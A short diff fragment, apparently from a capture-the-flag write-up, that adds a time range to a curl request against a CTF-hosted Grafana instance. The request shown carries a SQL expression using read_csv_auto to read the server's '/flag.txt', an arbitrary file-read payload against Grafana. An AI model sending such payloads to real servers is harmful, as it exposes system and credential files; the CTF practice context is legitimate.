@@ -326,5 +326,7 @@ curl -X POST "https://dalctf-grafana-jitsu-39-64616c.instancer.dalctf2026.com/ap
       "type": "sql",
       "expression": "SELECT * FROM read_csv_auto('\''/flag.txt'\'', header=false)"
     }
-  ]
+  ],
+  "from": "now-1h",
+  "to": "now"
 }'
